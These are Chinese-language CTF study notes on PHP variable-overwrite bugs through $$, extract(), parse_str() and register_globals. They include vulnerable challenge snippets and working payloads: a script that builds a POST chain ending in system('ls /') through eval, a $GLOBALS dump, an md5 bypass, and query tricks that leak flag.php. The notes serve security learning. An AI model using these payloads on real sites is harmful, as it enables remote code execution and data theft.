```
$a = 'b';
$b = 'ab';
$$a = 'bc' ;//此时$b会变成bc
```
代码审计搜搜$$
经常导致变量覆盖漏洞场景有：
$$，extract()函数，parse_str()函数，import_request_variables()使用不当，开启了全局变量注册等。

注意变量地址&a也可以赋值
## **extract()**
会自动url解码。
和parse_str()差不多。
extract($a, 0); //参数0：直接覆盖，不留警告。
例如：
`extract($_POST);`: 这个函数将 `$_POST` 数组中所有的键值对转换为变量和对应的值。例如，如果 `$_POST['user']` 存在，及POST传参user=xx，那么该函数将创建一个名为 `$user` 的变量，并将其值设置为 `$_POST['user']` 的值xx。


如果传参_SESSION[flag]=123。
那么覆盖只有$_SEESION[flag]=123。
**注意传参不要有引号_SESSION["flag"]不可**
^
```
extract($vars);  配合include $__template_path__;
若$vars传参可控，则可实现任意文件读取。
```

^
## **变量覆盖引出$GLOBALS数组**
$GLOBALS数组中有flag值。
```
function getFlag(&$v1,&$v2){
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}

 $v1 = $_GET['v1'];
 $v2 = $_GET['v2'];

if(preg_match('/ctfshow/', $v1)){
        getFlag($v1,$v2);
 }



?v1=ctfshow&v2=GLOBALS
类似
$ctfshow=$GLOBALS;
var_dump($ctfshow);
```

^
## **常规变量覆盖**
```
error_reporting(0);
extract($_POST);
eval($$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_);
highlight_file(__FILE__);
```
```
import string
a='_=a&'
s=string.ascii_letters
code="system('ls /');"
for i in range(35):
    a+=s[i]+"="+s[i+1]+"&"
a+=s[i]+"="+code
print(a)

POST传递：
_=a&a=b&b=......&I=J&J=system('ls /');
```


^
## **parse_str()函数**
类似extract()函数和变量覆盖。
parse_str() 函数把查询字符串解析到变量中。
如果未设置第二个参数的array参数，由该函数设置的变量将覆盖其他地方定义已存在的同名变量。
```
// 假设我们有一个 URL 编码的字符串
$str = "name=Kimi&age=30";

// 使用 parse_str() 解析字符串
parse_str($str);

// 输出解析后的变量
echo $name; // 输出 Kimi
echo $age;  // 输出 30

parse_str($str,$arr);   //将把值存在数组里
$arr['name']
$arr['age']
```
```
$v1 = $_POST['v1'];
$v3 = $_GET['v3'];
   parse_str($v1,$v2);
   if($v2['flag']==md5($v3)){
       echo $flag;
   }

Payload：
GET：v3=0
POST: v1=flag=cfcd208495d565ef66e7dff9f98764da
```

^
和extract()配合题：
```
$key1 = 0;
$key2 = 0;
if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {
    die("nonononono");
}
@parse_str($_SERVER['QUERY_STRING']);
extract($_POST);
if($key1 == '36d' && $key2 == '36d') {
    die(file_get_contents('flag.php'));
}
?_POST[key1]=36d&_POST[key2]=36d
通过parse_str转成$_POST[key1]=36d
通过extract转成$key1=36d
```


^
## **古老变量覆盖复活**
ini_get("register_globals")
* **作用**：读取 PHP 配置项 `register_globals` 的当前值（on / off）。
* **背景**：
  – `register_globals=On` 时，PHP 会把 `$_GET['id']` 直接变成 `$id`，`$_POST['user']` 直接变成 `$user`……\
  – 这是 **PHP 4/5 早期**的“方便”特性，**2000 年左右**就已被证明**极易引入变量覆盖漏洞**。

